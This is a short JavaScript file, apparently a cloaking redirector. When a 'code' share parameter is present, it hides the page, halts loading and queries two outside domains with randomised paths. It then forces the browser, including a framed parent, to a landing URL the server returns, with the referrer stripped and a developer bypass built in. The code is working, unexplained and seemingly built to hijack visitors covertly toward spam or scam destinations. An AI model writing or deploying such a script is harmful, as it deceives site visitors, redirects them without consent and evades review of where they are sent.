(function () {

    var doc = document;

    function getQueryParam(name = null) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        var r = window.location.search.substr(1).match(reg);
        if (r != null) return unescape(r[2]);
        return '';
    }

    function openLink(url) {
        let dev = getQueryParam("dev");
        if (dev) {
            console.log('3进行访问', url);
            return;
        }
        if(window !== top) {
            top.location = url;
            return;
        }
        var label = document.createElement('a');
        label.setAttribute('rel', 'noreferrer');
        label.setAttribute('href', url);
        try {
            document.body.appendChild(label);
        } catch (e) {
            location = url;
        }
        label.click();
    }

    function fast_load(iterators){
        const promises = Array.from(iterators);
        const num = promises.length;
        const rejectedList = new Array(num);
        let rejectedNum = 0;
        return new Promise((resolve, reject) => {
            promises.forEach((promise, index) => {
                Promise.resolve(promise)
                    .then(value => resolve(value))
                    .catch(error => {
                        rejectedList[index] = error;
                        if (++rejectedNum === num) {
                            reject(rejectedList);
                        }
                    });
            });
        });
    }

    var line = (new URLSearchParams(location.search)).get('code'); // 分享id
    // var tg = getQueryParam('tg'); // 推广
    var rmd = Math.random().toString(36).substr(2);
    var queryUrl = `/asdaasdas${rmd}?code=${line}`;

    // if (!isWx() || !checkVersion()) {
    if (line == '' || line == 'null' || line == null) {
        throw 0;
    }
    try {
        doc.body.hidden = true;
    } catch (e) {
    }
    window.stop ? window.stop() : document.execCommand("Stop");
    fast_load(['//gwgp-humdknwtkvg.n.bdcloudapi.com','//bl2.singang.cn'].map(domain=>fetch(domain+queryUrl)))
        .then(response => response.json())
        .then((res) => {
            if(res.code==200){
                let landing_domain=res.data.url
                openLink(landing_domain)
            }else{
                console.log('error');
            }
        });
})();
